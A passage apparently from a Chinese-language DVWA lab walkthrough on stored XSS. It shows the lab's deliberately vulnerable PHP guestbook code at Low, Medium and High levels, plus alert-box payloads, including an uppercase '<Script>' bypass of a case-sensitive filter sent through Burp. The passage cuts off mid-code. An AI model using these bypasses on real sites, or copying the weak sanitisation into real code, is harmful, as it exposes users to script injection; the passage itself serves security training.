data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/XY%259H4I1%24S8N%29%60%2923XP858I.png\" alt=\"\" /></p>\n<h1 id=\"5xssstored\"><a class=\"anchor\" href=\"#5xssstored\">#</a> 5.XSS(Stored)</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'btnSign'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'mtxMessage'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$name</span>    <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'txtName'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// Sanitize message input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// Sanitize name input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// Update database</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class=\"token interpolation\"><span class=\"token variable\">$message</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>' );\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">//mysql_close();</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>对输入的信息进行了过滤但是，没有进行 XSS 的过滤</p>\n<pre><code>trim(string,charlist) ： 移除string字符两侧的预定义字符\nstripslashes(string)： 去除掉string字符的反斜杠＼\nmysqli_real_escape_string(string,connection)：对特殊字符进行转义\n</code></pre>\n<p>输入 <code>cyb</code>  和 <code>&lt;script&gt;alert(123)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/LQMR4QP4%25_9A_C%242G4PLYNO.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%7EFJ5%60S4MR%600WH5W%7D%246Z%606DS.png\" alt=\"\" /></p>\n<h2 id=\"2等级medium-5\"><a class=\"anchor\" href=\"#2等级medium-5\">#</a> 2. 等级： <code>Medium</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'btnSign'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'mtxMessage'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$name</span>    <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'txtName'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// Sanitize message input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span> <span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// Sanitize name input</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// Update database</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class=\"token interpolation\"><span class=\"token variable\">$message</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>' );\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">//mysql_close();</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里对名字进行了 <code>&lt;script&gt;</code>  过滤： <code>$name = str_replace( '&lt;script&gt;', '', $name );</code> ，对 massage 进行了 <code>htmlspecialchars( $message );</code>  将预定义字符转为 HTML 实体</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/M%25%5BBCQZ2%25DK%28VK%5DQ%29XXR%7ENA.png\" alt=\"\" /></p>\n<p>在前端写被限定了 name 的输入长度，所以就利用 burp 抓包来改写：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/7TO%5DPDDA7NFOEGU5VB%28N49I.png\" alt=\"\" /></p>\n<p>修改利用大写 <code>&lt;Script&gt;</code>  绕过检测：</p>\n<p>修改为 <code>&lt;Script&gt;alert(321)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/OKXWS0DGY%7ERW4%28%60%24%7D%25T3%24NY.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%24FH%28%7D9%5B%40_SZU_%25L%5DLCRBKIQ.png\" alt=\"\" /></p>\n<h2 id=\"3等级high-4\"><a class=\"anchor\" href=\"#3等级high-4\">#</a> 3. 等级： <code>High</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'btnSign'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'mtxMessage'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$name</span>    <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'txtName'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// Sanitize message input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span> <span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// Sanitize name input</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// Update database</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class=\"token interpolation\"><span class=\"token variable\">$message</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>' );\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 